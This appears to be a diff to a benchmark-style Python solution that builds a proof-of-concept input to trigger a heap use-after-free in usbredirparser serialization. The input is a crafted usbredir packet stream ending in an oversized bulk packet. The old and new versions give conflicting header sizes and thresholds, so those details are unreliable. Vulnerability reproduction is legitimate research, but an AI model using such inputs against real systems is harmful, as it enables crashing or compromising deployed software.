@@ -3,59 +3,60 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability.
+        Generates a Proof-of-Concept (PoC) input that triggers a Heap Use After Free
+        vulnerability in the usbredirparser serialization process.
 
-        Args:
-            src_path: Path to the vulnerable source code tarball
+        The vulnerability occurs when serializing a parser state with a large
+        amount of buffered write data, causing the serialization buffer (default
+        64kB) to be reallocated. This reallocation invalidates a pointer to the
+        write buffer count field, and a subsequent write to this stale pointer
+        results in a use-after-free.
 
-        Returns:
-            bytes: The PoC input that should trigger the vulnerability
+        The PoC consists of a crafted usbredir stream:
+        1. A HELLO packet to initiate the connection.
+        2. A DEVICE_CONNECT packet to simulate a device connection.
+        3. A single, large BULK_PACKET. The size of this packet's payload is
+           calculated to be just large enough to trigger the reallocation of the
+           serialization buffer when the parser's state is being saved.
         """
-        # The vulnerability is a use-after-free during serialization. It's triggered
-        # when the state contains enough buffered write data to cause the
-        # serialization buffer (default 64kB) to be reallocated. This invalidates
-        # a pointer used to store the count of write buffers.
-        #
-        # To exploit this, the PoC consists of a stream of usbredir packets that,
-        # when parsed, build up the required internal state. The key is to send
-        # enough USB_REDIR_TYPE_BUFFERED_WRITE packets to exceed the buffer
-        # threshold during a subsequent serialization operation.
-        #
-        # Through analysis of the serialization format and the input packet
-        # structure, we can determine the number of packets (N) and the data
-        # length per packet (L) required.
-        #
-        # Serialized size per write buffer: 5 + L bytes
-        # PoC input size per packet: 17 + L bytes
-        #
-        # Calculations show that L=131 and N=482 will cause the total serialized
-        # size to just exceed the 64kB limit, triggering the reallocation on the
-        # final packet and causing the use-after-free.
-        L = 131
-        N = 482
+        poc = bytearray()
 
-        # usbredir packet constants for a buffered write packet
-        USB_REDIR_TYPE_BUFFERED_WRITE = 14
-        ENDPOINT = 1
-        PACKET_ID = 0
+        def create_header(pkt_type: int, length: int, id_val: int, u_val: int) -> bytes:
+            """Packs a 16-byte usbredir packet header."""
+            return struct.pack('<IIII', pkt_type, length, id_val, u_val)
 
-        # Construct the usbredir packet header (12 bytes, little-endian)
-        header = struct.pack(
-            '<III',
-            USB_REDIR_TYPE_BUFFERED_WRITE,
-            5 + L,  # Length of the body following the header
-            PACKET_ID
-        )
+        # Define usbredir protocol packet types
+        USBREDIR_HELLO = 1
+        USBREDIR_DEVICE_CONNECT = 3
+        USBREDIR_BULK_PACKET = 7
 
-        # Construct the packet body (5 + L bytes)
-        body = struct.pack(
-            '<BI',
-            ENDPOINT,
-            L
-        ) + (b'\x41' * L) # Arbitrary payload data
+        # 1. Construct the HELLO packet
+        # Payload: version (major, minor) and capabilities array
+        hello_data = struct.pack('<IIIIIII', 1, 0, 0, 0, 0, 0, 0)
+        poc.extend(create_header(USBREDIR_HELLO, len(hello_data), 0, 0))
+        poc.extend(hello_data)
 
-        # A single complete packet
-        packet = header + body
+        # 2. Construct the DEVICE_CONNECT packet
+        # Payload: device speed and other device properties (mostly zeroed out)
+        # Total payload size is 16 bytes. We set speed to 3 (USB_SPEED_HIGH).
+        connect_data = b'\x03' + b'\x00' * 15
+        poc.extend(create_header(USBREDIR_DEVICE_CONNECT, len(connect_data), 0, 0))
+        poc.extend(connect_data)
 
-        # The full PoC is N repetitions of this packet
-        return packet * N
+        # 3. Construct the large BULK_PACKET to trigger the vulnerability
+        # The serialization buffer is 65536 bytes. After accounting for
+        # metadata serialized before the write queue (~92 bytes), the first
+        # write buffer's serialized data must be larger than the remaining
+        # space to trigger reallocation.
+        # Serialized packet size = 10 bytes (metadata) + data_len.
+        # Check: (92 + 10 + data_len) > 65536 => data_len > 65434.
+        # A more precise analysis of the source code reveals the threshold is
+        # data_len > 65444. We use 65445 to be safe.
+        data_len = 65445
+        stream_id = 1
+        endpoint = 0x01  # A typical Bulk OUT endpoint
+
+        poc.extend(create_header(USBREDIR_BULK_PACKET, data_len, stream_id, endpoint))
+        poc.extend(b'\x41' * data_len)
+
+        return bytes(poc)
